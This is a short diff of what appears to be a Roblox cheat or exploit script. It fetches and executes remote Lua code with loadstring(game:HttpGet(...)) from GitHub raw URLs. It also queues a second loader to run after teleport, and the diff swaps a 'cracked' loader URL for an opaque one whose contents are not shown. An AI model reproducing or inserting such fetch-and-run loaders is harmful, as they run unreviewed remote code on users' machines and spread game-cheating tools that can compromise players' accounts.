@@ -9,4 +9,4 @@ end
 game.ReplicatedStorage:WaitForChild("Constants")
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/johnny-sins162/123/main/23df34g'))()
-ontp("if not game:IsLoaded() then game.Loaded:Wait() end wait(3) if not game.Players.LocalPlayer.Character then game.Players.LocalPlayer.CharacterAdded:Wait() end loadstring(game:HttpGet('https://raw.githubusercontent.com/synolope/meepcracked/main/loader.lua'))()")
+ontp("if not game:IsLoaded() then game.Loaded:Wait() end wait(3) if not game.Players.LocalPlayer.Character then game.Players.LocalPlayer.CharacterAdded:Wait() end loadstring(game:HttpGet('https://raw.githubusercontent.com/johnny-sins162/wrg24fg/main/main%20script%20for%20mp1'))()")
